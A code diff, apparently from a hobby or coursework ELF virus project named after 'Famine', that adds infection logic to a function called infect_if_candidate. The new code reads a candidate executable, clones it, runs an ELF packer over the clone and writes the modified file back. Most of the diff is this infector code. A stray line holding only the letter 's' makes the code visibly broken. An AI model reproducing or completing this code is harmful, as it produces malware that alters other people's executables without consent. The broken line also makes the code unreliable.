@@ -10,9 +10,10 @@
 /*                                                                            */
 /* ************************************************************************** */
 
+#include <sys/stat.h>
 #include "infect.h"
 
-static inline void	set_endian(struct famine *food, bool big_mode)
+static inline void	set_endian(struct endians_pointer *endians, bool big_mode)
 {
 	uint16_t	(*mode_2[])(uint16_t) =
 	{
@@ -30,9 +31,9 @@ static inline void	set_endian(struct famine *food, bool big_mode)
 		endian_8_swap
 	};
 
-	food->endian_2 = mode_2[big_mode];
-	food->endian_4 = mode_4[big_mode];
-	food->endian_8 = mode_8[big_mode];
+	endians->endian_2 = mode_2[big_mode];
+	endians->endian_4 = mode_4[big_mode];
+	endians->endian_8 = mode_8[big_mode];
 }
 
 inline void		infect_if_candidate(const char *file)
@@ -44,9 +45,19 @@ inline void		infect_if_candidate(const char *file)
 	if (famine_read(fd, e_ident, 16) < 16) return;
 
 	struct famine	food;
-	set_endian(&food, e_ident[EI_DATA] == ELFDATA2MSB);
-
-	// printf("[%s]\n", file);
+	set_endian(&food.endians, e_ident[EI_DATA] == ELFDATA2MSB);
 
 	famine_close(fd);
+
+	food.original_safe = read_file(file);
+	if (food.original_safe.ptr == NULL) return;
+
+	food.clone_safe = alloc_clone(food.original_safe.filesize);
+	if (food.clone_safe.ptr == NULL) return;
+s
+	elf64_packer(food, food.original_safe.filesize);
+	write_clone_file(food.clone_safe);
+
+	free_clone(food.clone_safe);
+	free_file(food.original_safe);
 }
